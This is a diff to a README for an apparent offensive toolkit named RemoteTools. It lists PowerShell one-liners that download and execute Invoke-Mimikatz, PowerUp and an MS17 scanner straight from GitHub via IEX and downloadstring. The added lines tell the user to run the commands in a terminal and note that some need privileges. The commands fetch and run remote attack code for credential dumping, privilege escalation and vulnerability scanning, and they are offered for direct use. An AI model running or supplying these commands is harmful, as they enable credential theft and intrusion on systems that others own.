@@ -1,10 +1,12 @@
 # RemoteTools
 
 ## These are configured to be run via powershell remotely.  
+Run any of the following commands via the powershell terminal
 
 ### Credit to the original authors 
 
-### Mimikatz
+### Mimikatz 
+#### Requires privs
 
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/Invoke-Mimikatz.ps1')  
 
@@ -21,5 +23,6 @@ IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/PowerUp.ps1')
 
 ### MS17 Scanner (Requires Powershell AD Module)
+#### Requires privs
 
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/MS17.ps1')
